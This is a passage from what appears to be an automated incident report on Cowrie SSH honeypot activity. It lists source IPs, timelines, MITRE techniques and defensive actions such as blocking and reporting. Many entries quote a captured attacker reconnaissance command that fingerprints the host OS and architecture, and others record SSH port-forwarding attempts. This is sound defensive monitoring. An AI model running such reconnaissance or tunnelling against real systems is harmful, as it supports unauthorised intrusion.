| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:20:20` | `cowrie.session.connect` |
| `2026-07-26 05:20:20` | `cowrie.client.version` |
| `2026-07-26 05:20:20` | `cowrie.client.kex` |
| `2026-07-26 05:20:20` | `cowrie.login.success` |
| `2026-07-26 05:20:20` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:20:20` | `cowrie.direct-tcpip.ja4` |
| `2026-07-26 05:20:20` | `cowrie.direct-tcpip.data` |
| `2026-07-26 05:20:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f6d9160d1ef

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:21 |
| **Last Seen** | 2026-07-26 05:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:21:22` | `cowrie.session.connect` |
| `2026-07-26 05:21:23` | `cowrie.client.version` |
| `2026-07-26 05:21:23` | `cowrie.client.kex` |
| `2026-07-26 05:21:25` | `cowrie.login.success` |
| `2026-07-26 05:21:26` | `cowrie.session.params` |
| `2026-07-26 05:21:26` | `cowrie.command.input` |
| `2026-07-26 05:21:26` | `cowrie.command.input` |
| `2026-07-26 05:21:26` | `cowrie.command.input` |
| `2026-07-26 05:21:26` | `cowrie.command.input` |
| `2026-07-26 05:21:26` | `cowrie.command.input` |
| `2026-07-26 05:21:26` | `cowrie.command.success` |
| `2026-07-26 05:21:26` | `cowrie.command.input` |
| `2026-07-26 05:21:26` | `cowrie.command.input` |
| `2026-07-26 05:21:26` | `cowrie.command.input` |
| `2026-07-26 05:21:26` | `cowrie.command.input` |
| `2026-07-26 05:21:27` | `cowrie.log.closed` |
| `2026-07-26 05:21:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7467f84e3f30

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:22 |
| **Last Seen** | 2026-07-26 05:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:22:59` | `cowrie.session.connect` |
| `2026-07-26 05:22:59` | `cowrie.client.version` |
| `2026-07-26 05:22:59` | `cowrie.client.kex` |
| `2026-07-26 05:23:01` | `cowrie.login.success` |
| `2026-07-26 05:23:02` | `cowrie.session.params` |
| `2026-07-26 05:23:02` | `cowrie.command.input` |
| `2026-07-26 05:23:02` | `cowrie.command.input` |
| `2026-07-26 05:23:02` | `cowrie.command.input` |
| `2026-07-26 05:23:02` | `cowrie.command.input` |
| `2026-07-26 05:23:02` | `cowrie.command.input` |
| `2026-07-26 05:23:02` | `cowrie.command.success` |
| `2026-07-26 05:23:02` | `cowrie.command.input` |
| `2026-07-26 05:23:02` | `cowrie.command.input` |
| `2026-07-26 05:23:02` | `cowrie.command.input` |
| `2026-07-26 05:23:02` | `cowrie.command.input` |
| `2026-07-26 05:23:03` | `cowrie.log.closed` |
| `2026-07-26 05:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b3b11cf3e2a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-26 05:23 |
| **Last Seen** | 2026-07-26 05:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:23:52` | `cowrie.session.connect` |
| `2026-07-26 05:23:52` | `cowrie.client.version` |
| `2026-07-26 05:23:52` | `cowrie.client.kex` |
| `2026-07-26 05:23:53` | `cowrie.login.success` |
| `2026-07-26 05:23:53` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:23:53` | `cowrie.direct-tcpip.ja4` |
| `2026-07-26 05:23:53` | `cowrie.direct-tcpip.data` |
| `2026-07-26 05:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55eb6617a070

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:24 |
| **Last Seen** | 2026-07-26 05:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:24:35` | `cowrie.session.connect` |
| `2026-07-26 05:24:35` | `cowrie.client.version` |
| `2026-07-26 05:24:35` | `cowrie.client.kex` |
| `2026-07-26 05:24:37` | `cowrie.login.success` |
| `2026-07-26 05:24:38` | `cowrie.session.params` |
| `2026-07-26 05:24:38` | `cowrie.command.input` |
| `2026-07-26 05:24:38` | `cowrie.command.input` |
| `2026-07-26 05:24:38` | `cowrie.command.input` |
| `2026-07-26 05:24:38` | `cowrie.command.input` |
| `2026-07-26 05:24:38` | `cowrie.command.input` |
| `2026-07-26 05:24:38` | `cowrie.command.success` |
| `2026-07-26 05:24:38` | `cowrie.command.input` |
| `2026-07-26 05:24:38` | `cowrie.command.input` |
| `2026-07-26 05:24:38` | `cowrie.command.input` |
| `2026-07-26 05:24:38` | `cowrie.command.input` |
| `2026-07-26 05:24:39` | `cowrie.log.closed` |
| `2026-07-26 05:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10abab563d88

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-26 05:26 |
| **Last Seen** | 2026-07-26 05:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:26:10` | `cowrie.session.connect` |
| `2026-07-26 05:26:11` | `cowrie.client.version` |
| `2026-07-26 05:26:11` | `cowrie.client.kex` |
| `2026-07-26 05:26:13` | `cowrie.login.success` |
| `2026-07-26 05:26:14` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:26:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4070fd45cc1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:26 |
| **Last Seen** | 2026-07-26 05:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:26:13` | `cowrie.session.connect` |
| `2026-07-26 05:26:14` | `cowrie.client.version` |
| `2026-07-26 05:26:14` | `cowrie.client.kex` |
| `2026-07-26 05:26:15` | `cowrie.login.success` |
| `2026-07-26 05:26:16` | `cowrie.session.params` |
| `2026-07-26 05:26:16` | `cowrie.command.input` |
| `2026-07-26 05:26:16` | `cowrie.command.input` |
| `2026-07-26 05:26:16` | `cowrie.command.input` |
| `2026-07-26 05:26:16` | `cowrie.command.input` |
| `2026-07-26 05:26:16` | `cowrie.command.input` |
| `2026-07-26 05:26:16` | `cowrie.command.success` |
| `2026-07-26 05:26:16` | `cowrie.command.input` |
| `2026-07-26 05:26:16` | `cowrie.command.input` |
| `2026-07-26 05:26:16` | `cowrie.command.input` |
| `2026-07-26 05:26:16` | `cowrie.command.input` |
| `2026-07-26 05:26:17` | `cowrie.log.closed` |
| `2026-07-26 05:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81c36a8918e9

| Field | Detail |
|---|---|
| **Source IP** | `223.223.194[.]187` |
| **First Seen** | 2026-07-26 05:26 |
| **Last Seen** | 2026-07-26 05:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:26:24` | `cowrie.session.connect` |
| `2026-07-26 05:26:25` | `cowrie.client.version` |
| `2026-07-26 05:26:25` | `cowrie.client.kex` |
| `2026-07-26 05:26:28` | `cowrie.login.success` |
| `2026-07-26 05:26:28` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.223.194[.]187` to AbuseIPDB if not already reported
- [ ] Block `223.223.194[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1cb3a4c842a

| Field | Detail |
|---|---|
| **Source IP** | `103.68.52[.]210` |
| **First Seen** | 2026-07-26 05:26 |
| **Last Seen** | 2026-07-26 05:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:26:55` | `cowrie.session.connect` |
| `2026-07-26 05:26:56` | `cowrie.client.version` |
| `2026-07-26 05:26:56` | `cowrie.client.kex` |
| `2026-07-26 05:26:58` | `cowrie.login.success` |
| `2026-07-26 05:26:59` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:27:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.52[.]210` to AbuseIPDB if not already reported
- [ ] Block `103.68.52[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eafa2fbd60ef

| Field | Detail |
|---|---|
| **Source IP** | `14.194.128[.]158` |
| **First Seen** | 2026-07-26 05:27 |
| **Last Seen** | 2026-07-26 05:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:27:04` | `cowrie.session.connect` |
| `2026-07-26 05:27:05` | `cowrie.client.version` |
| `2026-07-26 05:27:05` | `cowrie.client.kex` |
| `2026-07-26 05:27:06` | `cowrie.login.success` |
| `2026-07-26 05:27:07` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.128[.]158` to AbuseIPDB if not already reported
- [ ] Block `14.194.128[.]158` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0882a11191cf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:27 |
| **Last Seen** | 2026-07-26 05:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:27:50` | `cowrie.session.connect` |
| `2026-07-26 05:27:50` | `cowrie.client.version` |
| `2026-07-26 05:27:50` | `cowrie.client.kex` |
| `2026-07-26 05:27:52` | `cowrie.login.success` |
| `2026-07-26 05:27:53` | `cowrie.session.params` |
| `2026-07-26 05:27:53` | `cowrie.command.input` |
| `2026-07-26 05:27:53` | `cowrie.command.input` |
| `2026-07-26 05:27:53` | `cowrie.command.input` |
| `2026-07-26 05:27:53` | `cowrie.command.input` |
| `2026-07-26 05:27:53` | `cowrie.command.input` |
| `2026-07-26 05:27:53` | `cowrie.command.success` |
| `2026-07-26 05:27:53` | `cowrie.command.input` |
| `2026-07-26 05:27:53` | `cowrie.command.input` |
| `2026-07-26 05:27:53` | `cowrie.command.input` |
| `2026-07-26 05:27:53` | `cowrie.command.input` |
| `2026-07-26 05:27:54` | `cowrie.log.closed` |
| `2026-07-26 05:27:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2b5b876554a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:29 |
| **Last Seen** | 2026-07-26 05:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:29:30` | `cowrie.session.connect` |
| `2026-07-26 05:29:30` | `cowrie.client.version` |
| `2026-07-26 05:29:30` | `cowrie.client.kex` |
| `2026-07-26 05:29:31` | `cowrie.login.success` |
| `2026-07-26 05:29:33` | `cowrie.session.params` |
| `2026-07-26 05:29:33` | `cowrie.command.input` |
| `2026-07-26 05:29:33` | `cowrie.command.input` |
| `2026-07-26 05:29:33` | `cowrie.command.input` |
| `2026-07-26 05:29:33` | `cowrie.command.input` |
| `2026-07-26 05:29:33` | `cowrie.command.input` |
| `2026-07-26 05:29:33` | `cowrie.command.success` |
| `2026-07-26 05:29:33` | `cowrie.command.input` |
| `2026-07-26 05:29:33` | `cowrie.command.input` |
| `2026-07-26 05:29:33` | `cowrie.command.input` |
| `2026-07-26 05:29:33` | `cowrie.command.input` |
| `2026-07-26 05:29:33` | `cowrie.log.closed` |
| `2026-07-26 05:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ca5f54917c8

| Field | Detail |
|---|---|
| **Source IP** | `60.249.252[.]94` |
| **First Seen** | 2026-07-26 05:30 |
| **Last Seen** | 2026-07-26 05:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:30:22` | `cowrie.session.connect` |
| `2026-07-26 05:30:23` | `cowrie.client.version` |
| `2026-07-26 05:30:23` | `cowrie.client.kex` |
| `2026-07-26 05:30:25` | `cowrie.login.success` |
| `2026-07-26 05:30:25` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:30:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.249.252[.]94` to AbuseIPDB if not already reported
- [ ] Block `60.249.252[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efa475ee9d80

| Field | Detail |
|---|---|
| **Source IP** | `92.126.223[.]175` |
| **First Seen** | 2026-07-26 05:30 |
| **Last Seen** | 2026-07-26 05:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:30:30` | `cowrie.session.connect` |
| `2026-07-26 05:30:31` | `cowrie.client.version` |
| `2026-07-26 05:30:31` | `cowrie.client.kex` |
| `2026-07-26 05:30:32` | `cowrie.login.success` |
| `2026-07-26 05:30:33` | `cowrie.direct-tcpip.request` |
| `2026-07-26 05:30:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.126.223[.]175` to AbuseIPDB if not already reported
- [ ] Block `92.126.223[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82602520255f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:31 |
| **Last Seen** | 2026-07-26 05:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:31:11` | `cowrie.session.connect` |
| `2026-07-26 05:31:11` | `cowrie.client.version` |
| `2026-07-26 05:31:11` | `cowrie.client.kex` |
| `2026-07-26 05:31:13` | `cowrie.login.success` |
| `2026-07-26 05:31:14` | `cowrie.session.params` |
| `2026-07-26 05:31:14` | `cowrie.command.input` |
| `2026-07-26 05:31:14` | `cowrie.command.input` |
| `2026-07-26 05:31:14` | `cowrie.command.input` |
| `2026-07-26 05:31:14` | `cowrie.command.input` |
| `2026-07-26 05:31:14` | `cowrie.command.input` |
| `2026-07-26 05:31:14` | `cowrie.command.success` |
| `2026-07-26 05:31:14` | `cowrie.command.input` |
| `2026-07-26 05:31:14` | `cowrie.command.input` |
| `2026-07-26 05:31:14` | `cowrie.command.input` |
| `2026-07-26 05:31:14` | `cowrie.command.input` |
| `2026-07-26 05:31:15` | `cowrie.log.closed` |
| `2026-07-26 05:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22ce6e116a8f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:32 |
| **Last Seen** | 2026-07-26 05:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 05:32:54` | `cowrie.session.connect` |
| `2026-07-26 05:32:55` | `cowrie.client.version` |
| `2026-07-26 05:32:55` | `cowrie.client.kex` |
| `2026-07-26 05:32:57` | `cowrie.login.success` |
| `2026-07-26 05:32:58` | `cowrie.session.params` |
| `2026-07-26 05:32:58` | `cowrie.command.input` |
| `2026-07-26 05:32:58` | `cowrie.command.input` |
| `2026-07-26 05:32:58` | `cowrie.command.input` |
| `2026-07-26 05:32:58` | `cowrie.command.input` |
| `2026-07-26 05:32:58` | `cowrie.command.input` |
| `2026-07-26 05:32:58` | `cowrie.command.success` |
| `2026-07-26 05:32:58` | `cowrie.command.input` |
| `2026-07-26 05:32:58` | `cowrie.command.input` |
| `2026-07-26 05:32:58` | `cowrie.command.input` |
| `2026-07-26 05:32:58` | `cowrie.command.input` |
| `2026-07-26 05:32:59` | `cowrie.log.closed` |
| `2026-07-26 05:32:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2a36bfe7d0e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 05:34 |
| **Last Seen** | 2026-07-26 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
